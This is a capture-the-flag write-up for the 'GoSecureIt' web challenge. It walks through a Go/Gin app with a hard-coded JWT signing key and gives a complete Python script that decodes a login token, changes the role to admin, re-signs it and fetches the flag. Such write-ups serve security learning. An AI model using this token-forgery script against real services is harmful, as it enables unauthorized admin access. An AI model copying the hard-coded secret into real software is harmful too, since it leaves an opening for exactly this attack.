+++
title = 'GoSecureIt'
tags = [
  "Web",
  "Golang",
  "Leaked secret",
  "50 points",
  "95 solves",
  "Schrödy",
]
date = 2024-12-23T16:49:40+01:00
draft = true
+++



<h1 style='text-decoration: underline;text-decoration-color: #9e8c6c;font-size: 3em;'>GoSecureIt</h1>

**Description**: I've found this website under construction, at the moment you can only register, but I think there's something strange in the cookie


## Introduction

We are faced with an application written in go, not very complex with several files, but already looking at the folder tree we see the secret folder with secret.go inside and this code

## Source

```go
// filename: secret.go
package secret

var JwtSecretKey = []byte("schrody_is_always_watching") // I don't know why it's called secret, I'll just leave it here :)
```
Obviously this is the cookie secret, but interacting with the web application there is not much to do, so it is worth checking other files, especially in Golang, when using the Gin framework it is often used to define routes in the main.go, in fact if we open it we can see

```go
// filename: main.go
r.GET("/flag", handler.AuthMiddleware(), func(c *gin.Context) {
		role, _ := c.Get("role")
		if role == "admin" {
			c.String(http.StatusOK, os.Getenv("flag"))
		} else {
			c.String(http.StatusForbidden, "No flag for a normal user :/")
		}
	})
```

We can see that the role value is checked to see if it is admin, in which case the flag is printed, even though with c.GET it looks like it takes a get parameter it actually takes the value from the cookie we need to re-sign.

## Solution

So to solve the challenge, all we have to do is modify the cookie we get when we log in by changing the role to admin and signing it with the leaked key.

```python
# filename: exploit.py

#!/usr/bin/python3
import random
import string

import requests
import jwt

BASE_URL = "https://gosecureit.challs.m0lecon.it/"

s = requests.Session()

def string_generator(length):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def sign_jwt(cookie,secret):
    decoded_jwt = jwt.decode(cookie, secret, algorithms=["HS256"])
    decoded_jwt['role'] = 'admin'
    resigned_jwt = jwt.encode(decoded_jwt, secret, algorithm='HS256')
    return resigned_jwt

def register(username,password):
    r = requests.post(BASE_URL + "register", data={"username": username, "password": password})
    if r.status_code != 200:
        print("[+] Failed to register")
        exit(1)
    else:
        print("[+] Registered successfully")

def login(username,password):
    r = requests.post(BASE_URL + "login", data={"username": username, "password": password})
    if r.status_code != 200:
        print("[+] Failed to login")
        exit(1)
    else:
        print("[+] Login successfully")

    return r.json()

def main():
    username,password = string_generator(10),string_generator(10)
    secret = "schrody_is_always_watching"
    register(username,password)
    cookies = login(username,password)
    new_jwt = sign_jwt(cookies['token'],secret)
    s.cookies.set('jwt', new_jwt)
    r = s.get(BASE_URL + "flag")
    print("Flag: " + r.text)

if __name__ == "__main__":
	main()

# goodluck by @akiidjk
```

```stdout
$ flag: ptm{Th4t'5_why_1t'5_c4ll3d_53cr3t?}
```
<p align='right'>Author: akiidjk </p>
